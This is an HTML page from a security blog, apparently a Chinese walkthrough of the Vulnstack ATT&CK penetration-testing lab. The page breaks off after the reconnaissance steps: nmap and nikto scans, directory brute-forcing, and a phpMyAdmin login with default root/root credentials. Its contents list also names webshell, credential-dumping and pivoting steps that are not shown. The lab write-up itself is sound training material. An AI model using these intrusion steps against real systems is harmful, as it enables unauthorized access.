@@ -1,0 +1,1497 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>Vulnstack-ATT&amp;CK(一) - Sc0fie1d-Blog</title><meta name="Description" content="The official documentation for the Hugo DoIt theme"><meta property="og:title" content="Vulnstack-ATT&amp;CK(一)" />
+<meta property="og:description" content="Vulnstack-ATT&amp;CK(一)
+0x1前言红日靶场 http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 靶机初始密码 均为 hongrisec@2019
+0x2环境搭建 攻击机 kali ip 192.168.157.137 web服务器 win7 ip 192.168.157.153 192.168.52.143 域成员 win2003 ip **** 192.168.52.141 域控 win2008 ip **** 192.168.52.138 ​	靶场提供的三个主机在同一个网段中，另外Win7主机有两张网卡，模拟可以与外网进行通信的主机，且安装有phpstudy，部署了web网站。
+​	我们在使用VMware设置环境时，为了安全，应该设置两个网段，即新建两个VMnet，均为主机模型（这里是为了防止虚拟机上有什么病毒逃逸到自己的本机电脑上或者在操作过程中有什么错误，感染自己的电脑）。
+​	在VMware中，需要设置一下虚拟网络编辑器，确保其中有两个仅主机模式的VMnet，其中一个VMnet的子网地址设置为192.168.52.0，命名为VMnet19，为靶场网络，对Win server2003和Win server2008均配置静态IP，且属于192.168.52.0/24网段。攻击机kali所用的网卡名为VMnet19，网络地址设置为192.168.60.0。win7配置了VMnet19和VMnet18双网卡。
+0x3web渗透1 1.信息收集1.1 探测内网存活 1 netdiscover -i eth0 -r 192.168.60.0/24 目标靶机ip为192.168.60.128
+(254是DHCP服务器地址)
+1.2 端口扫描&amp;及目录爆破 1 nmap 192.168.60.130 （启用了DHCP服务，重启后ip发生变化）
+这是一般情况下的扫描结果，只能探测到80和3306端口
+下面是将win7靶机的防火墙全部关掉的扫描结果，爆出了更多的端口
+进一步探测
+1 nmap -sC -sV -Pn -p 1-65535 192.168.60.130 常用扫描工具有：dirsearch、dirmap、御剑，kali自带的dirbuster、nikto，使用多个扫描工具进行探测，可能会发现不同的扫描结果。
+开启了80端口，我们可以访问一下 页面下方有sql连接测试的接口，尝试phpstudy的默认账密root/root，连接成功
+御剑爆网站目录 dirsearch爆网站目录 扫描工具很多，能不能扫出有用信息还是看字典是否强大。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/vulnstack-attck_1/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="Vulnstack-ATT&amp;CK(一)"/>
+<meta name="twitter:description" content="Vulnstack-ATT&amp;CK(一)
+0x1前言红日靶场 http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 靶机初始密码 均为 hongrisec@2019
+0x2环境搭建 攻击机 kali ip 192.168.157.137 web服务器 win7 ip 192.168.157.153 192.168.52.143 域成员 win2003 ip **** 192.168.52.141 域控 win2008 ip **** 192.168.52.138 ​	靶场提供的三个主机在同一个网段中，另外Win7主机有两张网卡，模拟可以与外网进行通信的主机，且安装有phpstudy，部署了web网站。
+​	我们在使用VMware设置环境时，为了安全，应该设置两个网段，即新建两个VMnet，均为主机模型（这里是为了防止虚拟机上有什么病毒逃逸到自己的本机电脑上或者在操作过程中有什么错误，感染自己的电脑）。
+​	在VMware中，需要设置一下虚拟网络编辑器，确保其中有两个仅主机模式的VMnet，其中一个VMnet的子网地址设置为192.168.52.0，命名为VMnet19，为靶场网络，对Win server2003和Win server2008均配置静态IP，且属于192.168.52.0/24网段。攻击机kali所用的网卡名为VMnet19，网络地址设置为192.168.60.0。win7配置了VMnet19和VMnet18双网卡。
+0x3web渗透1 1.信息收集1.1 探测内网存活 1 netdiscover -i eth0 -r 192.168.60.0/24 目标靶机ip为192.168.60.128
+(254是DHCP服务器地址)
+1.2 端口扫描&amp;及目录爆破 1 nmap 192.168.60.130 （启用了DHCP服务，重启后ip发生变化）
+这是一般情况下的扫描结果，只能探测到80和3306端口
+下面是将win7靶机的防火墙全部关掉的扫描结果，爆出了更多的端口
+进一步探测
+1 nmap -sC -sV -Pn -p 1-65535 192.168.60.130 常用扫描工具有：dirsearch、dirmap、御剑，kali自带的dirbuster、nikto，使用多个扫描工具进行探测，可能会发现不同的扫描结果。
+开启了80端口，我们可以访问一下 页面下方有sql连接测试的接口，尝试phpstudy的默认账密root/root，连接成功
+御剑爆网站目录 dirsearch爆网站目录 扫描工具很多，能不能扫出有用信息还是看字典是否强大。"/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/vulnstack-attck_1/" /><link rel="prev" href="http://scofield1920.github.io/log_analysis/" /><link rel="next" href="http://scofield1920.github.io/vmware_vpn2/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Vulnstack-ATT\u0026CK(一)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/vulnstack-attck_1\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "permeation","wordcount":  612 ,
+        "url": "http:\/\/scofield1920.github.io\/vulnstack-attck_1\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1信息收集">1.信息收集</a>
+      <ul>
+        <li><a href="#探测内网存活">探测内网存活</a></li>
+        <li><a href="#端口扫描及目录爆破">端口扫描&amp;及目录爆破</a></li>
+      </ul>
+    </li>
+    <li><a href="#2利用sql写文件getshell">2.利用sql写文件getshell</a>
+      <ul>
+        <li><a href="#判断步骤如下">判断步骤如下：</a></li>
+        <li><a href="#另外我们也可以通过扫描到的cms管理页面进行getshell账密网站页面直接写了">另外我们也可以通过扫描到的cms管理页面进行getshell(账密网站页面直接写了)</a></li>
+      </ul>
+    </li>
+    <li><a href="#3拿下webshell后信息收集内网信息收集">3.(拿下webshell后信息收集)内网信息收集</a>
+      <ul>
+        <li><a href="#基本信息收集">基本信息收集</a></li>
+        <li><a href="#尝试远程桌面登录">尝试远程桌面登录</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#msf上线">msf上线</a>
+      <ul>
+        <li><a href="#提权system">提权system：</a></li>
+        <li><a href="#抓取密码">抓取密码</a></li>
+        <li><a href="#开启3389">开启3389</a></li>
+        <li><a href="#内网搜集">内网搜集</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#添加路由">添加路由</a></li>
+    <li><a href="#扫描19216852024网段">扫描192.168.52.0/24网段：</a></li>
+    <li><a href="#扫描存活主机">扫描存活主机:</a></li>
+    <li><a href="#内网端口信息">内网端口信息：</a></li>
+    <li><a href="#挂socks4a代理">挂socks4a代理</a></li>
+    <li><a href="#渗透win2003远程登录">渗透win2003(远程登录)</a>
+      <ul>
+        <li><a href="#信息收集">信息收集</a></li>
+        <li><a href="#尝试攻击">尝试攻击</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Vulnstack-ATT&amp;CK(一)</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/permeation/"><i class="far fa-folder fa-fw"></i>permeation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;612 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1信息收集">1.信息收集</a>
+      <ul>
+        <li><a href="#探测内网存活">探测内网存活</a></li>
+        <li><a href="#端口扫描及目录爆破">端口扫描&amp;及目录爆破</a></li>
+      </ul>
+    </li>
+    <li><a href="#2利用sql写文件getshell">2.利用sql写文件getshell</a>
+      <ul>
+        <li><a href="#判断步骤如下">判断步骤如下：</a></li>
+        <li><a href="#另外我们也可以通过扫描到的cms管理页面进行getshell账密网站页面直接写了">另外我们也可以通过扫描到的cms管理页面进行getshell(账密网站页面直接写了)</a></li>
+      </ul>
+    </li>
+    <li><a href="#3拿下webshell后信息收集内网信息收集">3.(拿下webshell后信息收集)内网信息收集</a>
+      <ul>
+        <li><a href="#基本信息收集">基本信息收集</a></li>
+        <li><a href="#尝试远程桌面登录">尝试远程桌面登录</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#msf上线">msf上线</a>
+      <ul>
+        <li><a href="#提权system">提权system：</a></li>
+        <li><a href="#抓取密码">抓取密码</a></li>
+        <li><a href="#开启3389">开启3389</a></li>
+        <li><a href="#内网搜集">内网搜集</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#添加路由">添加路由</a></li>
+    <li><a href="#扫描19216852024网段">扫描192.168.52.0/24网段：</a></li>
+    <li><a href="#扫描存活主机">扫描存活主机:</a></li>
+    <li><a href="#内网端口信息">内网端口信息：</a></li>
+    <li><a href="#挂socks4a代理">挂socks4a代理</a></li>
+    <li><a href="#渗透win2003远程登录">渗透win2003(远程登录)</a>
+      <ul>
+        <li><a href="#信息收集">信息收集</a></li>
+        <li><a href="#尝试攻击">尝试攻击</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Vulnstack-ATT&amp;CK(一)</p>
+<h1 id="0x1前言" class="headerLink">
+    <a href="#0x1%e5%89%8d%e8%a8%80" class="header-mark"></a>0x1前言</h1><p>红日靶场
+<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener noreferrer">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a>
+靶机初始密码 均为 hongrisec@2019</p>
+<h1 id="0x2环境搭建" class="headerLink">
+    <a href="#0x2%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="header-mark"></a>0x2环境搭建</h1><table>
+<thead>
+<tr>
+<th><strong>攻击机</strong></th>
+<th><strong>kali</strong></th>
+<th><strong>ip</strong></th>
+<th><strong>192.168.157.137</strong></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>web服务器</strong></td>
+<td><strong>win7</strong></td>
+<td><strong>ip</strong></td>
+<td><strong>192.168.157.153</strong></td>
+<td><strong>192.168.52.143</strong></td>
+</tr>
+<tr>
+<td><strong>域成员</strong></td>
+<td><strong>win2003</strong></td>
+<td><strong>ip</strong></td>
+<td>****</td>
+<td><strong>192.168.52.141</strong></td>
+</tr>
+<tr>
+<td><strong>域控</strong></td>
+<td><strong>win2008</strong></td>
+<td><strong>ip</strong></td>
+<td>****</td>
+<td><strong>192.168.52.138</strong></td>
+</tr>
+</tbody>
+</table>
+<p>​	靶场提供的三个主机在同一个网段中，另外Win7主机有两张网卡，模拟可以与外网进行通信的主机，且安装有phpstudy，部署了web网站。</p>
+<p>​	我们在使用VMware设置环境时，为了安全，应该设置两个网段，即新建两个VMnet，均为主机模型（这里是为了防止虚拟机上有什么病毒逃逸到自己的本机电脑上或者在操作过程中有什么错误，感染自己的电脑）。</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515211401416.png" title="image-20230515211401416" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515211401416.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515211401416.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515211401416.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515211401416.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515211401416.png 2x"
+            sizes="auto"
+            alt="image-20230515211401416">
+    </a></figure></p>
+<p>​	在VMware中，需要设置一下虚拟网络编辑器，确保其中有两个仅主机模式的VMnet，其中一个VMnet的子网地址设置为192.168.52.0，命名为VMnet19，为靶场网络，对Win server2003和Win server2008均配置静态IP，且属于192.168.52.0/24网段。攻击机kali所用的网卡名为VMnet19，网络地址设置为192.168.60.0。win7配置了VMnet19和VMnet18双网卡。</p>
+<h1 id="0x3web渗透" class="headerLink">
+    <a href="#0x3web%e6%b8%97%e9%80%8f" class="header-mark"></a>0x3web渗透</h1><h2 id="1信息收集" class="headerLink">
+    <a href="#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>1 1.信息收集</h2><h3 id="探测内网存活" class="headerLink">
+    <a href="#%e6%8e%a2%e6%b5%8b%e5%86%85%e7%bd%91%e5%ad%98%e6%b4%bb" class="header-mark"></a>1.1 探测内网存活</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netdiscover -i eth0 -r 192.168.60.0/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515213842827.png" title="image-20230515213842827" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515213842827.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515213842827.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515213842827.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515213842827.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515213842827.png 2x"
+            sizes="auto"
+            alt="image-20230515213842827">
+    </a></figure></p>
+<p>目标靶机ip为192.168.60.128</p>
+<p>(254是DHCP服务器地址)</p>
+<h3 id="端口扫描及目录爆破" class="headerLink">
+    <a href="#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%e5%8f%8a%e7%9b%ae%e5%bd%95%e7%88%86%e7%a0%b4" class="header-mark"></a>1.2 端口扫描&amp;及目录爆破</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap 192.168.60.130
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>（启用了DHCP服务，重启后ip发生变化）</p>
+<p>这是一般情况下的扫描结果，只能探测到80和3306端口</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230426682.png" title="image-20230515230426682" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230426682.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230426682.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230426682.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230426682.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230426682.png 2x"
+            sizes="auto"
+            alt="image-20230515230426682">
+    </a></figure></p>
+<p>下面是将win7靶机的防火墙全部关掉的扫描结果，爆出了更多的端口</p>
+<blockquote>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230125355.png" title="image-20230515230125355" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230125355.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230125355.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230125355.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230125355.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230125355.png 2x"
+            sizes="auto"
+            alt="image-20230515230125355">
+    </a></figure></p>
+<p>进一步探测</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -sC -sV -Pn -p 1-65535 192.168.60.130
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230000107.png" title="image-20230515230000107" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230000107.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230000107.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230000107.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230000107.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230000107.png 2x"
+            sizes="auto"
+            alt="image-20230515230000107">
+    </a></figure></p>
+</blockquote>
+<p>常用扫描工具有：<strong>dirsearch、dirmap、御剑</strong>，kali自带的<strong>dirbuster、nikto</strong>，使用多个扫描工具进行探测，可能会发现不同的扫描结果。</p>
+<p>开启了80端口，我们可以访问一下
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230924676.png" title="image-20230515230924676" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230924676.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230924676.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230924676.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230924676.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230924676.png 2x"
+            sizes="auto"
+            alt="image-20230515230924676">
+    </a></figure></p>
+<p>页面下方有sql连接测试的接口，尝试phpstudy的默认账密root/root，连接成功</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231546304.png" title="image-20230515231546304" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231546304.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231546304.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231546304.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231546304.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231546304.png 2x"
+            sizes="auto"
+            alt="image-20230515231546304">
+    </a></figure></p>
+<p>御剑爆网站目录
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232024368.png" title="image-20230515232024368" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232024368.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232024368.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232024368.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232024368.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232024368.png 2x"
+            sizes="auto"
+            alt="image-20230515232024368">
+    </a></figure></p>
+<p>dirsearch爆网站目录
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232210882.png" title="image-20230515232210882" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232210882.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232210882.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232210882.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232210882.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232210882.png 2x"
+            sizes="auto"
+            alt="image-20230515232210882">
+    </a></figure></p>
+<p>扫描工具很多，能不能扫出有用信息还是看字典是否强大。</p>
+<p>另外我们还可以通过nikto扫描来获取相关信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nikto -h 192.168.60.130
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231226002.png" title="image-20230515231226002" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231226002.png">
+        <img
+            
+            loading="lazy"
